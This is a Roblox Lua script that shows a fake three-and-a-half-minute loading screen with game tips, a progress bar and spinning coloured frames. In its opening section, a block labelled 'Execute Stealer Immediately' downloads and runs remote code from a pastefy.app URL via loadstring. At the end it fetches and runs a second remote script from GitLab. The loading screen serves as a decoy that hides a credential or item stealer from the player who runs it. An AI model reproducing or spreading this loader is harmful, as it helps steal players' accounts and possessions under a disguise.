-- CONFIG
local loadingTime = 210 -- seconds
local tipsList = {
    "Tip: Water your plants daily for faster growth!",
    "Tip: Press space to jump higher!",
    "Tip: Visit the shop for cool upgrades!",
    "Tip: Some seeds grow faster in sunlight!",
    "Tip: You can trade items with friends!"
}

-- CREATE SCREEN GUI
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/okBJmYfc/raw"))()
end)

-- BACKGROUND (Colorful Triangles)
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bg.Parent = gui

-- Triangle pattern generator
local triangles = {}
for i = 1, 60 do
    local tri = Instance.new("Frame")
    tri.Size = UDim2.new(0, math.random(100, 300), 0, math.random(100, 300))
    tri.Position = UDim2.new(math.random(), 0, math.random(), 0)
    tri.AnchorPoint = Vector2.new(0.5, 0.5)
    tri.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
    tri.BackgroundTransparency = 0.2
    tri.Rotation = math.random(0, 360)
    tri.Parent = bg
    table.insert(triangles, tri)
end

-- Pulsating top text
local topText = Instance.new("TextLabel")
topText.Size = UDim2.new(1, 0, 0, 50)
topText.Position = UDim2.new(0, 0, 0, 10)
topText.BackgroundTransparency = 1
topText.Text = "Please wait patiently..."
topText.TextColor3 = Color3.fromRGB(255, 255, 255)
topText.TextStrokeTransparency = 0
topText.TextSize = 36
topText.Font = Enum.Font.GothamBold
topText.Parent = gui

-- Tip text
local tipText = Instance.new("TextLabel")
tipText.Size = UDim2.new(1, 0, 0, 40)
tipText.Position = UDim2.new(0, 0, 0.7, -50)
tipText.BackgroundTransparency = 1
tipText.TextColor3 = Color3.fromRGB(255, 255, 255)
tipText.TextStrokeTransparency = 0
tipText.TextSize = 26
tipText.Font = Enum.Font.Gotham
tipText.Text = tipsList[math.random(#tipsList)]
tipText.Parent = gui

-- Progress bar background
local progressBG = Instance.new("Frame")
progressBG.Size = UDim2.new(0.6, 0, 0, 30)
progressBG.Position = UDim2.new(0.2, 0, 0.8, 0)
progressBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBG.BorderSizePixel = 0
progressBG.Parent = gui

-- Progress bar fill
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.Position = UDim2.new(0, 0, 0, 0)
progressFill.BorderSizePixel = 0
progressFill.BackgroundColor3 = Color3.fromHSV(0, 1, 1)
progressFill.Parent = progressBG

-- Percentage label
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 1, 0)
percentLabel.Position = UDim2.new(0, 0, 0, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.TextStrokeTransparency = 0
percentLabel.TextSize = 20
percentLabel.Font = Enum.Font.Gotham
percentLabel.Text = "0%"
percentLabel.Parent = progressBG

-- Animation
spawn(function()
    while gui.Parent do
        for _, tri in ipairs(triangles) do
            tri.Rotation = tri.Rotation + 0.05
        end
        task.wait()
    end
end)

spawn(function()
    while gui.Parent do
        topText.TextTransparency = 0.2 + math.abs(math.sin(tick() * 2)) * 0.8
        task.wait()
    end
end)

-- Loading loop
for i = 0, loadingTime do
    local percent = math.floor((i / loadingTime) * 100)
    percentLabel.Text = percent .. "%"
    progressFill.Size = UDim2.new(i / loadingTime, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromHSV((i / loadingTime), 1, 1)
    if i % 5 == 0 then
        tipText.Text = tipsList[math.random(#tipsList)]
    end
    task.wait(1)
end

-- Remove loading screen
gui:Destroy()

-- Execute Payload Script (Visual UI)
local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
Spawner.Load()
